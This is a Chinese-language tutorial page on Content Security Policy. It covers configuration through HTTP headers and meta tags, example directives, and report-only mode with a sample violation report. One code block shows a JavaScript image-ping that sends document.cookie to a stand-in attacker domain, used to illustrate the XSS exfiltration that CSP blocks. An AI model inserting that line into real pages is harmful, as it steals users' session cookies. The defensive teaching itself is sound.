---
title: CSP 浏览器内存安全策略
date: 2021-08-11 19:18:36
sidebar: auto
category: 
  - 软件安全
head:
  - - meta
    - name: keyword
      content: 内容安全策略(CSP),XSS防御
description: 内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等。
---

## 什么是CSP?  ##

这里一段定义是来自于MDN社区
> Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware.

内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。

参考来源

https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

## 使用CSP的两种方式

 - 通过服务器 HTTP 头部的 Content-Security-Policy 来指定
 - 通过 HTML 文档的 meta 标签配置策略

 例如：

 使用 HTTP 头部，这里的 policy 为策略字符串

 ```
 Content-Security-Policy: policy
 ```

使用 HTML meta 标签的方式

 ```HTML
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
 ```

 ## 主要防范目标

 CSP主要是防范 XSS 攻击，以及报告 XSS 攻击，如果页面存在漏洞让 JS 脚本注入，CSP 能限制脚本的运行，然后把损失降到最小

 

 ``` Javascript
 (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;

 ```

 CSP 是通过限制加载到页面上的资源、域或者协议来实现的，例如，一旦入侵者找到漏洞注入了XSS攻击，入侵者可以通过 图片Ping的方式发送敏感信息到外部网站。CSP 可以指定允许信任域名下的图片、Script和样式表被加载到页面上，及时入侵者 XSS 入侵成功也无法通过这些方式发送数据，保证网站一定程度上安全。


另外 CSP 也提供了只允许加载指定协议，例如HTTPS的资源，否则自动跳转到 HTTPS 版本。


## 使用 CSP 


当我们需要使用CSP生效就需要编写相应的策略，策略包括一系列指令组成和设置定的值组成。

例如，一个网站管理者允许内容来自信任的域名及其子域名 

```
Content-Security-Policy: default-src 'self' *.trusted.com

```

我们再看一条策略：

```
Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com

```

这条策略有4个指令 img-src 为图片资源，media-src 为视频媒体资源，script-src 为脚本资源。最重要的一个是 default-src 为所有的资源默认属性，这里设置为了 ‘self’ 的含义为所有的资源再不指定的情况下只能从自身域下加载。

## 资源

## 报告违规情况

CSP 提供了另外一个非常有用的模式 - 报告模式，如果在 HTTP 头部指定 Content-Security-Policy-Report-Only 可以将发生了任何违规的事件都会被报告出去，但是这个头部只会对报告生效，实际生效还是需要 在Content-Security-Policy 中指定。

在报告的策略中需要配置一个 report-uri 用于服务器接受违规报告情况，例如：


```

Content-Security-Policy: default-src 'self'; report-uri http://reportcollector.example.com/collector.cgi


```

浏览器会向 report-uri 中指定的地址使用 POST 发送一个 JSON 格式的数据包。


数据包格式如下：

``` JSON

{
  "csp-report": {
    "document-uri": "http://example.com/signup.html",
    "referrer": "",
    "blocked-uri": "http://example.com/css/style.css",
    "violated-directive": "style-src cdn.example.com",
    "original-policy": "default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports"
  }
}

```




